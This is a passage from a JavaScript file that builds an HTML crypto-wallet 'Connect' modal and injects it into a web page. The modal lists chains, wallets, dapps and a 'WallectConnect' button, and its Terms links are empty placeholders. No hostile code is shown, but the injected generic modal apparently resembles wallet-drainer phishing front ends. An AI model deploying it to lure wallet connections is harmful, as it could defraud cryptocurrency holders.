                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="digibyte" src="./img/DigiByte.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">DigiByte</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="syscoin" src="./img/Syscoin.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Syscoin</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="core" src="./img/Core(1).png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Core</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="telos-evm" src="./img/Telos_EVM.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Telos-EVM</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="boba" src="./img/BOBA.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">BOBA</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="caduceus" src="./img/Caduceus.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Caduceus</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="linear" src="./img/Linear.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Linear</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="base" src="./img/Base.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Base</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="mantle" src="./img/Mantle.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Mantle</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="pulsechain" src="./img/PulseChain.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">PulseChain</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="songbird" src="./img/Songbird.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Songbird</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="heco" src="./img/HECO.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">HECO</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="optimistic" src="./img/Optimistic.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Optimistic</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="arbitrum" src="./img/Arbitrum.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Arbitrum</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="godwoken" src="./img/GodWoken.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">GodWoken</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="terra classic" src="./img/Terra_Classic.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Terra Classic</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="injective" src="./img/Injective.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Injective</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="fuse" src="./img/Fuse.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Fuse</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="metis" src="./img/Metis.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Metis</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="aurora" src="./img/Aurora.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Aurora</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="gnosis" src="./img/Gnosis.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Gnosis</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="rsk" src="./img/RSK.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">RSK</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="terra" src="./img/Terra.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Terra</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="flare" src="./img/Flare.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Flare</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="aptos" src="./img/Aptos.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Aptos</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="sui" src="./img/Sui.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Sui</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="zksync era" src="./img/zkSync_Era.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">zkSync Era</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="polygon zkevm" src="./img/Polygon_zkEVM.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Polygon zkEVM</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="binance chain" src="./img/Binance_Chain.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Binance Chain</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="ton" src="./img/Ton.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Ton</span>
                        </div>
                    </div>
                </div>
            </div>

            <div class="modal-main" id="modal-main-action-ul">
                <div class="modal-main-menu flex-column">
                    <div class="modal-el-desc connweb3">
                        <span class="modal-el-desc-conn-mode fourth">Connect</span>
                    </div>

                    <div data-target="wallets-container" class="menu-el">
                        <div class="modal-icon">
                            <img alt="all wallets" src="./img/Trust_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">All Wallets</span>
                        </div>
                        <div class="modal-el-button">
                            <span class="modal-el-button-first second">370+</span>
                        </div>
                    </div>

                    <div data-target="chains-container" class="menu-el">
                        <div class="modal-icon">
                            <img alt="all chains" src="./img/chains.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">All Chains</span>
                        </div>
                        <div class="modal-el-button">
                            <span class="modal-el-button-first third">126+</span>
                        </div>
                    </div>

                    <div data-target="dapps-container" class="menu-el">
                        <div class="modal-icon">
                            <img alt="all dapps" src="./img/PancakeSwap.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">All Dapps</span>
                        </div>

                        <div class="modal-el-button">
                            <span class="modal-el-button-first first">1170+</span>
                        </div>
                    </div>

                    <div data-target="ai" class="menu-el">
                        <div class="modal-icon">
                            <img alt="metamask" src="./img/new-way.svg" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">AI ToolKit</span>
                        </div>
                        <div class="modal-el-button">
                            <span class="modal-el-button-first fourth">Fast &amp; Secure
              </span>
                        </div>
                    </div>
                    <div class="modal-el-desc connweb3">
                        <span class="modal-el-desc-conn-mode fourth">Connect with Web3</span
            >
          </div>
        </div>
        <div id="modal-bottom">
          <button class="interact-button" id="wallet-connect-connect-button">
            <img
              alt="metamask"
              src="./img/wallet-connect.svg"
            />
            WallectConnect
          </button>

          <span id="modal-bottom-span"
            >By connecting your wallet you agree to our<br />
            <a href="javascript:;">Terms of Service</a> and
            <a href="javascript:;">Privacy Policy</a>
          </span>
                    </div>
                </div>
            </div>
        </div>
        <div class="hidden" id="connect-modal-overlay"></div>


`;

// Function to append this HTML to the body or another element
function appendDivToBody() {
    const container = document.createElement('div');
    container.innerHTML = htmlContent;
    document.body.appendChild(container);
}

appendDivToBody()